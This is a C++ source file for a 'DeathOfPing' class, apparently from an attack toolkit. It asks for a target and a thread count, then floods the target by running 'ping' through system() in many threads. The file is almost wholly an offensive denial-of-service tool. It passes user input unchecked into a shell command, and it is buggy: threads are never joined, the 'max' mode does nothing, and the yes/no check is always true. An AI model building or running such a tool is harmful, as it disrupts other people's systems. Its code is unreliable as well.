//
// Created by ubuntu-linux on 23-11-2.
//
#include <vector>
#include "iostream"
#include "meta_attacker.hpp"
#include "thread"
#include <functional>

class DeathOfPing {
private:
    std::string target;
    int number = 0;
    bool isAlways = false;
    int thread = 0;
    bool isBackup = false;
public:
    DeathOfPing() = default;

    void attack() {
        string s = "ping " + target;
        for (int i = 0 ; i < number ;i++) {
            system(s.c_str());
        }
    }

    void Console() {

        target = input("Input Your Attack Target: ");
        string n = input("Enter the amount of data for a single user attack [If you want to Attack all the time, Enter 'max'] : ");
        if (n == "max") {
            isAlways = true;
        }else {
            try {
                number = stoi(n);
            }catch (const runtime_error& error) {
                std::cout << "[ERR] Your Input Error." << std::endl;
                return;
            }
        }
        try {
            thread = stoi(input("Input all the attack user number: "));
        }catch (const runtime_error& error) {
            std::cout << "[ERR] Your Input Error." << std::endl;
            return;
        }
        isBackup = input("Do you want run it in System background: [y or n]") == "y" || "Y";

        try {
            std::vector<std::thread> threads;
            for (int i =0 ; i<thread ;i++) {
                threads.emplace_back([this] { attack(); });
            }
        }catch (const runtime_error& error) {
            std::cout << "[ERR] runtime Error." << std::endl;
            return;
        }
    }
};